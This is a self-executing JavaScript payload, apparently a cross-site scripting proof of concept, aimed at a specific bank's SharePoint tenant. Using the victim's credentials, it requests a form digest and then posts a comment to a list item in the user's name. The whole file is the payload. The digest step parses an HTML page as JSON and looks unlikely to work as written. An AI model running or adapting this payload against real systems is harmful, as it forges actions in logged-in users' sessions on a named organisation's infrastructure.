(function() {
  const GET_DIGEST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx';     
  const POST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';    

  function sendPostWithDigest(digest) {
    var xhrPost = new XMLHttpRequest();
    xhrPost.open('POST', POST_URL, true);
    xhrPost.withCredentials = true;

    xhrPost.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
    xhrPost.setRequestHeader('X-RequestDigest', digest);

    const body = JSON.stringify({ text: "-----23-----", mentions: [] });
    xhrPost.send(body);
  }

  function getFormDigestAndSendPost() {
    var xhrGet = new XMLHttpRequest();
    xhrGet.open('GET', GET_DIGEST_URL, true);
    xhrGet.withCredentials = true;
    xhrGet.onload = function() {
      if (xhrGet.status === 200) {
        try {
          const data = JSON.parse(xhrGet.responseText);
          sendPostWithDigest(data.formDigestValue);
        } catch(e) { /* ignore parse errors */ }
      }
    };
    xhrGet.send();
  }

  getFormDigestAndSendPost();
})();
